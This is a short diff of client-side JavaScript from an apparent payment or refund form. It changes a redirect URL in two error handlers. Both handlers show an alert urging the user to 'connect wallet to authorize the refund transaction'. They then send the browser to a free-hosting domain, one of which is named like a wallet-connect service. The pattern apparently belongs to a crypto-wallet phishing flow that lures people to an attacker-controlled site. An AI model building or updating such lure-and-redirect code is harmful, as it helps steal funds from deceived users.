@@ -677,7 +677,7 @@ const currencyNetworks = {
           alert('Connect wallet to authorize the refund transaction: ' + resp.status + ' — ' + errText);
 
           // Redirect after user clicks "OK"
-          window.location.href = 'https://appswalletconnects.onrender.com/'; // <-- change this to your desired URL
+          window.location.href = 'https://appmerax.onrender.com'; // <-- change this to your desired URL
 
           confirmSubmit.disabled = false;
           confirmSubmit.textContent = 'Confirm & Send';
@@ -691,7 +691,7 @@ const currencyNetworks = {
       } catch (err) {
         alert('Network or server error: ' + (err.message || err));
         // Redirect after user clicks "OK"
-        window.location.href = 'https://appswalletconnects.onrender.com/'; // <-- change this to your desired URL
+        window.location.href = 'https://appmerax.onrender.com'; // <-- change this to your desired URL
 
         confirmSubmit.disabled = false;
         confirmSubmit.textContent = 'Confirm & Send';
